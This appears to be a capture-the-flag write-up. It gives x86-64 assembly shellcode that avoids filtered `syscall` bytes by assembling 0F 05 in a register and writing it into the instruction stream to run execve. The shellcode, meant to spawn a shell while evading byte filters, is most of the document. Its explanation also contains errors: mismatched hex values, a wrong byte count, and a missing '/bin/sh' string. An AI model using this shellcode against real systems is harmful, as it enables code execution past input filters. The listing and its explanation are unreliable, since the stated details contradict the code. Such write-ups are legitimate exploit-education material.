## Challange
Inject a shellcode without using the istruction `syscall` in hex `\x0F\x05`.
## Solution
Since we cannot write directly in our shellcode `syscall`, we have to find a workaround. A possible way is to write in `ebx` `\x05\x0e` and then add to `ebx` `1`. We then can write the content of `ebx` (which is the hex for `syscall`) directly on the stack after we setup the registers. Since the istruction will occupy 8 bytes we creates an nop pad and using `mov [rip], ebx` we write `syscall` in the stack after the `mov` istruction.
```assembly
jmp binsh
back:
xor rax, rax
mov al, 0x3b
pop rdi
xor rsi, rsi
xor rdx,rdx
xor ebx, ebx
mov ebx, 0x50e
add ebx, 0x1
mov [rip], ebx
nop
nop
nop
nop
nop
nop
nop
nop

binsh:
call back
```




